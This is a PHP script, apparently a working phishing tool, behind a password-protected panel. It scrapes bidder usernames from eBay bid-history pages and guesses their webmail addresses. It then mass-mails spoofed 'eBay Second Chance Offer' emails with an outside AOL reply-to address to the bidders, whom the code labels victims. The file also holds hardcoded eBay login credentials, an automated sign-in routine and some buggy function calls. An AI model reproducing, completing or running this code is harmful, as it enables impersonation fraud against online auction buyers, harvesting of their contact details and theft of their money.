<?php
session_id();
session_start();
error_reporting(E_ALL ^ E_NOTICE);
$parola = "virus";
$userEbay = "slobozeanu";
$parolaEbay = "ficatu";

if($_REQUEST['parola'] == $parola || $_SESSION['elogat'] == "da"){
	$_SESSION['elogat'] = "da";
	$display = 2;
}
else{
	$_SESSION['elogat'] = "nu";
	$display = 1;
}

//functii
function curl($url, $cookie = "", $post="") {
	$ch = curl_init();
	$agents = array();
	array_push($agents, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4");
	array_push($agents, "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4");
	array_push($agents, "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4");
	array_push($agents, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
	array_push($agents, "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2)");
	array_push($agents, "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)");
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_USERAGENT, $agents[rand(0,count($agents)-1)]);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_COOKIESESSION, true);
	curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
	if($post != "") {
		curl_setopt($ch, CURLOPT_POST, true); 
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post); 
	}
	if($cookie != "") {
		curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
		curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
	}
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	$result = curl_exec($ch);
	curl_close($ch);
	if($result == "") curl($url, $cookie, $post);
	else return $result;
}
function trimitemail($email, $item, $bidderid, $desc){
	$raspunde = "donderou@aol.com";
	$subiectEmail = "eBay Second Chance Offer for Item (".$item.")";
	$letter = file_get_contents("jet.html");
	$headers = "From: eBay <".$raspunde.">\r\n";
	$headers .= "Reply-To: donderou@aol.com\r\n";
	$headers .= "Return-Path: donderou@aol.com\r\n";
	$headers .= "Message-ID: <".time()." TheSystem@".$_SERVER['SERVER_NAME'].">\r\n";
	$headers .= "X-Mailer: PHP v".phpversion()."\r\n";
	$mime_boundary = uniqid("PHP-EMAIL");
	$mesaj = str_replace("%item%",$item,$letter);
	$mesaj = str_replace("%email%",$raspunde,$mesaj);
	$mesaj = str_replace("%bidderid%",$bidderid,$mesaj);
	$mesaj = str_replace("%desc%",$desc,$mesaj);
	$headers .= "MIME-Version: 1.0\r\n" . 
			"Content-Type: multipart/alternative;" . 
			" boundary = {$mime_boundary}\r\n\r\n";
	$headers .= "This is a MIME encoded message.\r\n\r\n" . 
			"--{$mime_boundary}\r\n" . 
			"Content-Type: text/html; charset=ISO-8859-1\r\n" . 
			"Content-Transfer-Encoding: base64\r\n\r\n" .  chunk_split(base64_encode($mesaj));
	if(@mail($email, $subiectEmail, "", $headers)) return $email." -> trimis cu succes<br/>";
	else return "";
}
function extractemail($username, $item, $bidderid, $desc) {
	$rez = "";
	$domenii = array("hotmail.com", "gmail.com", "yahoo.com", "msn.com",);
	for($i=0;$i<count($domenii);$i++){
		$email_address = $username."@".$domenii[$i];
		$rez .= trimitemail($email_address, $item, $bidderid, $bidderid);
		$rez .= trimitemail($desc);
	}
	return $rez;
}

function extractbids($id) {
	$get = curl("http://offer.ebay.in/ws/eBayISAPI.dll?ViewBids&item=".$id, $cookie);
	foreach(explode('eBayISAPI.dll?ViewFeedback&amp;userid=', $get) as $bids) {
		$user = explode('">', $bids);
		if(strpos($user[0], "</table>") === false) {
			$users .= $user[0]."\n";
		}
	}  
	$users = array_unique(explode("\n", $users));
	$users[0] = '';
	foreach($users as $complete) {
		if($complete !== '') {
			$bids = explode('eBayISAPI.dll?ViewFeedback&amp;userid='.$complete, $get);
			$bids = explode('(<a http://www.ebay.ph/viBidHistory?ItemId=%item%'.$complete, $get);
			$amount = explode('<td style="text-align:center;">', $bids[1]);
			$amount = explode('</td>', $amount[1]);
			$title = explode('<td class="nowrap" colspan="4">', $get);
			$title = explode('</td>', $title[1]);
			$date = explode('<td style="text-align:center;" class="spaceLeftRight10px">', $bids[1]);
			$date = explode('</td>', $date[1]);
			$fb = explode('">', $bids[1]);
			$fb = explode('</a>)', $fb[1]);
			if(strpos($title[0], "revised") !== false) {
				$title = explode('(<a href=', $title[0]); 
				$title[0] = trim($title[0]);
			}
			$user[0] = $complete." && ".trim($title[0])." && ".trim($amount[0])." && ".$id." && ".trim($date[0])." && ".$fb[0];
			$usere .= $user[0]."\n";
		}
	}
return explode("\n", $usere);
}
function login($user, $pass) {
	global $cookie;
	$getcookie = curl("http://signin.ebay.com/ws/eBayISAPI.dll?SignIn", $cookie);
	$login = curl("http://signin.ebay.com/ws/eBayISAPI.dll?co_partnerid=2&siteid=0&UsingSSL=1", $cookie, "MfcISAPICommand=SignInWelcome&siteid=0&co_partnerId=2&UsingSSL=1&i1=-1&pageType=-1&userid=".$user."&pass=".$pass);
	if(strpos($login, "The browser you are using is rejecting cookies") !== false){
		echo "Cannot write cookies, do chmod 777 *";
		//@unlink($cookie); 
		return false;
	}
	if(strpos($login, "Hello, </span><a") !== false){
		return true; 
	}else{
		//@unlink($cookie);
		return false;
	}
}
?>

<html>
<head>
<title>Special</title>
</head>
<body>
</body>
<?php
if($display == 2){
?>
	<table cellpadding="0" cellspacing="0" width="100%">
		<tr>
			<td>Extrage itemuri:</td>
		</tr>
		<tr>
			<td>
				<form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">
				<table align="center" cellpadding="0" cellspacing="0">
					<tr>
						<td>
							<textarea name="iteme" rows="10" cols="50"></textarea>
						</td>
					</tr>
					<tr>
						<td>
							<input type="submit" value="Cauta">
							<input type="hidden" name="tip" value="iteme">
						</td>
					</tr>
				</table>
				</form>
			</td>
		</tr>
		<tr>
			<td colspan="2">
<?php
	$path=realpath(dirname(__FILE__));
	$path=str_replace("\\","/",$path);
	$cookie = $path."/cookie_".session_id()."_".mktime().".txt";
	set_time_limit(0);
	ini_set("memory_limit","128M");
	if (! function_exists('curl_init')){
		echo("<center>Error: cURL not installed.</center>");
		exit();
	}
	/*if(login($userEbay, $parolaEbay) == false){
		echo "<center>Invalid user/pass</center>"; 
		@unlink($cookie); 
		//exit();
	}*/
	switch($_REQUEST['tip']){
		case "iteme":
			$iteme = trim($_REQUEST['iteme']);
			echo "<table align=\"center\" cellpadding=\"0\" cellspacing=\"0\" border=\"1\"><tr><td>User</td><td>Email</td><td>Title</td><td>Bid price</td><td>ID</td><td>Date</td><td>Feedback</td>";
			foreach(explode("\n", $iteme) as $linkbb){
				$bids = extractbids(trim($linkbb));
				foreach($bids as $users){
					if($users !== ""){
						$users = explode(" && ", $users);
						$vict =  extractemail($users[0],trim($linkbb),$users[0],$users[1]);
						$msg =  $users[0]." && ".$vict." && ".$users[1]." && ".$users[2]." && ".$users[3]." && ".$users[4]." && ".$users[5];
						echo "<tr>";
						foreach(explode(" && ", $msg) as $tabelul) echo "<td>".$tabelul."</td>";
						echo "</tr>";
					}
				}
			}
			echo "</table>";
		break;
	}
?>
			</td>
		</tr>
	</table>
<?php
}else{
?>
	<form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">
	<table cellpadding="0" cellspacing="0" align="center">
		<tr>
			<td>Parola:</td><td><input type="password" name="parola" value=""></td>
		</tr>
		<tr>
			<td colspan="2"><input type="submit" value="Intra"></td>
		</tr>
	</table>
	</form>
<?php
}
?>
</html>